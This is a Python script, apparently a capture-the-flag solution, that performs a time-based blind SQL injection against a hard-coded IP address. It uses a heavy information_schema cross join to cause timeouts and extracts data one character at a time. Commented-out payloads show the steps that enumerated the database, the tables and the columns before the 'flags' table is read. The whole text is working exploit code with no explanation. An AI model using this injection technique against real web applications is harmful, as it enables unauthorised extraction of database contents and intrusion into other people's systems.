import requests

url = "http://52.80.179.198:8080/article.php?id=1' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23"
data = ""
for i in range(1,1000):
    for j in range(33,127):
        #payload = "(ascii(substr((database()),%s,1))=%s)"%(i,j) #post
        #payload = "(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)" % (i, j) #article,flags
        #payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='flags'),%s,1))=%s)" % (i, j) #flag
        payload = "(ascii(substr((select flag from flags limit 1),%s,1))=%s)" % (i, j)
        payload_url = url%(payload)
        try:
            r = requests.get(url=payload_url,timeout=8)
        except:
            data +=chr(j)
            print data
            break